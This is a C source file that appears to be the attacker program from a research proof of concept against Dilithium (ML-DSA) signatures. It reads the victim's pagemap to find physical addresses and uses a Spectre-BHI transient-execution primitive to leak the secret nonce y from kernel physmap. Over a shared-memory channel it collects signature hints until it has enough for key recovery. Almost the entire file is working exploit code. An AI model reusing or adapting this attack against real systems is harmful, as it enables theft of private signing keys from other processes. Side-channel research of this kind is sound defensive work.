#include <stdio.h>
#include <stdint.h>
#include <assert.h>
#include "util.h"
#include "sign.h"
#include "packing.h"
#include "pwsc_spectre_bhi.h"
#include "mapping.h"
#include "pwsc.h"

#define CAN_MASK (0xffff800000000000UL)
#define PAGE_MASK (0xfffffffffffff000UL)
#define SIG_BOUND (876)

int main(int argc, char** argv) {
    (void) argc;
    /*
    argv[1]: pid
    argv[2]: y virtual address addr
    */
    // read arguments
    int pid;
    sscanf(argv[1], "%d", &pid);
    uint64_t y_addr;
    char* endp;
    y_addr = strtoul(argv[2], &endp, 0);

    uint8_t c[SEEDBYTES];
    poly cp;
    polyvecl z;
    polyveck h;

    uint64_t pfn, phy_addr;
    uint64_t last_y_addr = y_addr;
    load_pagemap(pid);
    pfn = get_pfn((uint64_t) y_addr);
    phy_addr = pfn*PAGE_SIZE | ((uint64_t) y_addr & (PAGE_SIZE-1));

    volatile msg_t* shared_channel = (msg_t*)create_shared_memory("sharedfile.txt");
    uint64_t trash = 0;
    printf("[+] shared channel set up\n");

    int acc_sig = 0;
    int cur_sig = 0;
    int msg_idx = 0;

    // collect c files init
    FILE *c_file = fopen("c.txt", "w");
    assert(c_file != NULL);

    // init pwsc spectre bhi 
    init_pwsc_spectre_bhi(); 

    while(1) {
        // wait for victim to sign
        MEM_BARRIER; INST_BARRIER;
        while(shared_channel->msg_flag == 1){trash = (trash + 1) & 0xffff;};
        MEM_BARRIER; INST_BARRIER;

        // dump signed message
        unpack_sig(c, &z, &h, (const uint8_t *)shared_channel->msg);
        poly_challenge(&cp, c);
        // dump cp
        for (int cp_idx=0; cp_idx<N; cp_idx++) {
            fprintf(c_file, "%d ", cp.coeffs[cp_idx]);
        }
        fprintf(c_file, "\n");
        // init cp account for current signature
        cur_sig = 0;
        // traverse z
        uint64_t cur_z = 0;
        uint64_t cur_y = 0;
        int cur_delta = 0;
        int cur_idx = 0;
        int cur_page_idx = 0;
        for (int z_vec_idx=0; z_vec_idx<L; z_vec_idx++) {
            for (int z_coeff_idx=0; z_coeff_idx<N; z_coeff_idx++) {
                assert(cur_idx == z_coeff_idx + z_vec_idx*N);
                // skip the last element
                if (cur_idx == L*N-1)
                    break;
                // get cur pointer (z)
                cur_z = *(uint64_t*)(&z.vec[z_vec_idx].coeffs[z_coeff_idx]);
                // page boundary check
                if (((y_addr + (cur_idx+1)*sizeof(uint32_t)) & PAGE_MASK) != (last_y_addr & PAGE_MASK)) {
                    last_y_addr = y_addr + (cur_idx+1)*sizeof(uint32_t);
                    pfn = get_pfn((uint64_t) last_y_addr);
                    phy_addr = pfn*PAGE_SIZE | ((uint64_t) last_y_addr & (PAGE_SIZE-1));
                    cur_idx++;
                    cur_page_idx = 0;
                    continue;
                }
                // canonical examine
                // only userspace pointers + VPN3 0 gate 
                if ((cur_z & CAN_MASK) == 0) { 
                    cur_y = leak_u64(phy_addr + cur_page_idx*sizeof(uint32_t) + PHYSMAP_START); 
                    printf("z: %#lx (%d, %d), ", cur_z, z_vec_idx, z_coeff_idx);
                    printf("y: %#lx (%#lx), ", cur_y, y_addr + cur_idx*sizeof(uint32_t));
                    cur_delta = (cur_z >> 32) - (cur_y >> 32);
                    printf("delta: %d\n\n", cur_delta);

                    // This requires a kernel module
                    uint64_t true_value = u64_leak(phy_addr + cur_page_idx*sizeof(uint32_t) + PHYSMAP_START);
                    printf("Leaked:\t0x%016lx\ntrue:\t0x%016lx\n\n", cur_y, true_value);

                    // delta check 
                    if(cur_delta < -78 || cur_delta > 78 || cur_y == 0) {
                        fprintf(stderr, "Skipping out of bounds...\n");
                    } else {
                        if((true_value>>32) != (cur_y>>32)) 
                            fprintf(stderr, "[BAD] INCORRECTLY FOUND HINT\n");
                        cur_sig++;
                        fprintf(c_file, "%d ", cur_idx);
                        fprintf(c_file, "%d\n", cur_delta);

                        // status report
                        fprintf(stderr, "===== TOTAL_SIGS: %d =====\n", acc_sig + cur_sig);
                    }
                    fflush(stdout);
                }
                cur_idx++;
                cur_page_idx++;
            }
        }
        printf("\n");
        acc_sig += cur_sig;
        printf("[+] Get %d signatures from message %d (acc: %d)\n", cur_sig, msg_idx, acc_sig);
        if (acc_sig >= SIG_BOUND) {
            printf("[+] Get enough signatures from %d messages\n", msg_idx+1);
            break;
        }
        // trigger victim for new signature
        MEM_BARRIER; INST_BARRIER;
        shared_channel->msg_flag = 1;
        MEM_BARRIER; INST_BARRIER;
        printf("[+] trigget victim for new signature\n");
        msg_idx++;
    }
    fclose(c_file);

    return 0;
}